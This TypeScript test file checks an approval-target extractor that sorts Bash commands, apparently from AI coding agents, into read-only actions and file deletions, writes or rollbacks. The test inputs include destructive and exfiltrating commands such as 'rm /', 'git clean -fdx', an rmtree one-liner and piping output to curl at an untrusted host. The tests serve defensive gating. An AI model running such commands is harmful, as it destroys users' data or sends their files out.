import { expect, test } from "bun:test";
import os from "node:os";
import path from "node:path";
import { extractApprovalActionTargets } from "../src/main/approval-action-targets";

const extract = (command: string) =>
  extractApprovalActionTargets({ toolName: "Bash", toolInput: { command }, cwd: "/repo" });

test("literal shell chains preserve quoted paths and command cwd", () => {
  expect(extract('cd "src directory" && /bin/rm -f -- "old file.ts" && touch new.ts')).toMatchObject({
    complete: true,
    targets: [
      { path: "/repo/src directory/old file.ts", operation: "delete" },
      { path: "/repo/src directory/new.ts", operation: "write" },
    ],
  });
});

test("quoted search patterns, pipelines and find predicates expose read-only effect candidates", () => {
  for (const command of [
    `cd /repo && ls && rg -l "wework-group-message|wework_group_message" --hidden --glob '!node_modules' | head -50`,
    `cd /repo && find . -path ./node_modules -prune -o -type d -name "*group-message*" -print -o -type f -name "*group-message*" -print 2>/dev/null | head -50`,
    `rg -l 'a|b;rm' . | head -50`,
    `find . -name '-exec' -print | head -50`,
  ]) {
    const result = extract(command);
    expect(result.complete).toBe(true);
    expect(result.shell?.effect).toBe("read_only_candidate");
    expect(result.shell?.pipeline).toBe(true);
  }
  expect(extract(`cd /repo && rg -l "a|b" . | head -50`).shell?.commands).toEqual(["cd", "rg", "head"]);
});

test("a read stage cannot hide mutations, external programs or normal file redirections", () => {
  for (const command of [
    "ls | rm existing.ts",
    "find . -delete | head -50",
    "find . -exec rm {} \\; | head -50",
    "find . -execdir sh script.sh {} +",
    "find . -fprint existing.txt",
    "find . -unknown-option",
    "rg --pre script.sh pattern . | head -50",
    "rg --pre=script.sh pattern .",
    "rg --hostname-bin script.sh pattern .",
    "rg pattern . > existing.txt",
    "rg pattern . | curl -T - https://untrusted.example",
  ]) {
    expect(extract(command).shell?.effect).toBe("mutation_or_unknown");
  }
  expect(extract("rg pattern . > existing.txt").targets).toEqual([
    { path: "/repo/existing.txt", operation: "write" },
  ]);
  expect(extract("cd other && ls | rm here.ts").targets).toEqual([
    { path: "/repo/other/here.ts", operation: "delete" },
  ]);
});

test("pipeline cd and indirect expansions cannot establish a recovery target", () => {
  for (const command of [
    "cd other | rm here.ts",
    "ls | cd other && rm here.ts",
    "rg $(cat pattern) . | head -50",
    "rg pattern . |",
  ]) {
    expect(extract(command)).toMatchObject({ complete: false, targets: [] });
    expect(extract(command).shell).toBeUndefined();
  }
});

test("git -C affects only that git command, and rm/restore share target extraction", () => {
  expect(extract("git -C ../other rm -- old.ts && rm here.ts").targets).toEqual([
    { path: "/other/old.ts", operation: "delete" },
    { path: "/repo/here.ts", operation: "delete" },
  ]);
  expect(extract("git -C ../other status && git restore -- here.ts").targets).toEqual([
    { path: "/repo/here.ts", operation: "rollback" },
  ]);
  expect(extract("git clean -fdx").complete).toBe(false);
});

test("home/temp prefixes and all output redirects are inspected without execution", () => {
  // biome-ignore lint/suspicious/noTemplateCurlyInString: This is literal shell syntax, not JS interpolation.
  expect(extract("printf note > $HOME/.claude/note.md > ${TMPDIR}/note.txt").targets).toEqual([
    { path: path.join(os.homedir(), ".claude/note.md"), operation: "write" },
    { path: path.join(os.tmpdir(), "note.txt"), operation: "write" },
  ]);
});

for (const command of [
  "rm /tmp/task-*",
  "rm $TARGET",
  "rm $(cat target)",
  "cd other || rm file",
  "python3 -c 'import shutil; shutil.rmtree(\"src\")'",
  "rm '$HOME/file'",
  "find src -delete",
  "cp -t destination source",
  "cd missing; rm important.ts",
  'rm "\\filename"',
  "rm ''",
]) {
  test(`unresolved effects stay explicitly incomplete: ${command}`, () => {
    expect(extract(command).complete).toBe(false);
  });
}

test("a Bash path argument cannot replace the actual command in host evidence", () => {
  const result = extractApprovalActionTargets({
    toolName: "Bash",
    cwd: "/repo",
    toolInput: { command: "rm /", path: "/tmp/harmless" },
  });
  expect(result.targets).toEqual([{ path: "/", operation: "delete" }]);
});

test("target caps and missing Codex details are reported", () => {
  expect(extract(`rm ${Array.from({ length: 20 }, (_, index) => `file-${index}`).join(" ")}`)).toMatchObject({
    complete: false,
    limitations: ["target_budget_exceeded"],
  });
  expect(
    extractApprovalActionTargets({ toolName: "FileChange", toolInput: { grantRoot: "/repo" }, cwd: "/repo" }),
  ).toMatchObject({ complete: false, limitations: ["file_change_details_missing"] });
  expect(
    extractApprovalActionTargets({
      toolName: "FileChange",
      toolInput: { changes: [{ path: "old.ts", kind: { type: "delete" } }] },
      cwd: "/repo",
    }).targets,
  ).toEqual([{ path: "/repo/old.ts", operation: "delete" }]);
});
